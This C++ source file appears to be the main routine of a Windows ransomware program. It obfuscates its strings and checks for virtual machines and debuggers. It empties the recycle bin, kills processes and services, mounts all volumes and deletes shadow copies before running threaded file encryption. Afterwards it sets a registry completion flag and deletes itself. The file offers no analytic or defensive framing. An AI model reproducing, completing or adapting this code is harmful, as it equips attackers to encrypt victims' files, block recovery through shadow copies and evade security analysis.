#include "include.h"
#include "config.h"
#include "filesSystem.h"
#include "Sys.h"
#include "utils.h"
#include "xorstr.hpp"
#include "AntiVM.h"

#define FEATURE_KEY(index, leaf_lo, leaf_hi, subleaf_key, subleaf_used, reg, bit) ( \
    (((index)        & 0x1F) <<  0) | \
    (((leaf_lo)      & 0x1F) <<  5) | \
    (((leaf_hi)      & 0x03) << 10) | \
    (((subleaf_key)  & 0x1F) << 12) | \
    (((subleaf_used) & 0x01) << 17) | \
    (((reg)          & 0x03) << 18) | \
    (((bit)          & 0x1F) << 20))

#pragma warning( push )
#pragma warning( disable : 4789 )
// unused code that generates compiler warning C4789`
#pragma warning( pop )

CRITICAL_SECTION critSection;


VOID SetFinishedEncryption()
{   
    HKEY hndKey = NULL;

    DWORD value = 1;

    RegCreateKeyEx(HKEY_CURRENT_USER, xorstr_(L"SoftwareWindows\\Running"), 0,
        NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hndKey, NULL);

    RegSetValueEx(hndKey, xorstr_(L"IHKEYEncryption"), 0, REG_DWORD, (const BYTE *)&value , sizeof(value));
    RegCloseKey(hndKey);

}



DWORD CheckFinishedEncryption()
{
    HKEY hKey;
    DWORD buffer;
    LONG result;
    unsigned long type = REG_DWORD, size = 1024;

    result = RegOpenKeyEx(HKEY_CURRENT_USER, xorstr_(L"SoftwareWindows\\Running"), 0, KEY_READ, &hKey);

    if (result == ERROR_SUCCESS)
    {
        RegQueryValueExW(hKey, xorstr_(L"IHKEYEncryption"), NULL, &type, (LPBYTE)&buffer, &size);
        
        return buffer;

        RegCloseKey(hKey);
    }

    return 0;
    
}

VOID AntiVmVoid()
{
    AntiVM::CheckForCPUCores();
    AntiVM::CheckForRamSize();
    AntiVM::CheckForHHDSize();
   


    AntiVM::DirectoryChecker();
    AntiVM::registryChecker();
    AntiVM::CurrentProcChecker();
    AntiVM::vbox_reg_key_value();
    AntiVM::vbox_reg_keys();


    AntiVM::CheckForRunningModule();
    AntiVM::CheckForBlackListPorc();
}





VOID SelfDeletion()
{
    TCHAR PATH_NAME[MAX_PATH];
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    GetModuleFileNameW(NULL, PATH_NAME, MAX_PATH);

    std::wstring szCmd = std::wstring(xorstr_(L"cmd.exe /C del ")).append(PATH_NAME).append(L" >> NULL");
    
   
    CreateProcessW(NULL, (TCHAR *)szCmd.c_str(), NULL,NULL, FALSE, CREATE_NO_WINDOW,
        NULL, NULL, &si, &pi);
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

}





int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    

    SetProcessShutdownParameters(0, 0);
    InitializeCriticalSection(&critSection);

    
    AntiVmVoid();

    
    TCHAR tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    StrCatW(tempPath, L"IHKEY.LOCK");
    
    if (boost::filesystem::exists(tempPath))
    {
        exit(69);
    }
    else
    {
        boost::filesystem::ofstream f(tempPath);
        f << "Hello, World !!";
        f.flush();
        f.close();
    }




    if (IsDebuggerPresent())
    {
        
        return 69;
    
    }




    if (CheckFinishedEncryption() == 1)
    {
       
        exit(69);
    }


    
    
   EmptyRecycleBin();

   
  //std::cout << "ProcessKiller" << endl;
   ProcessKiller();
  
  //std::cout << "ServiceKiller" << endl;
   ServiceKiller();
  

  //std::cout << "MountAllVolumes" << endl;
   MountAllVolumes();

   //std::cout << "ProcessKiller" << endl;
   ShadowDeleter();
  // std::cout << "ThreadSearchFilesEncrypting" << endl;
   ThreadSearchFilesEncrypting();
  

  
   // //set finished after encryption
   //std::cout << "SetFinishedEncryption" << endl;
   SetFinishedEncryption();

   //std::cout << "EmptyRecycleBin" << endl;
   EmptyRecycleBin();
   
   //delete the Program after finished
   boost::filesystem::remove(tempPath);
   SelfDeletion();


	return 1;
}
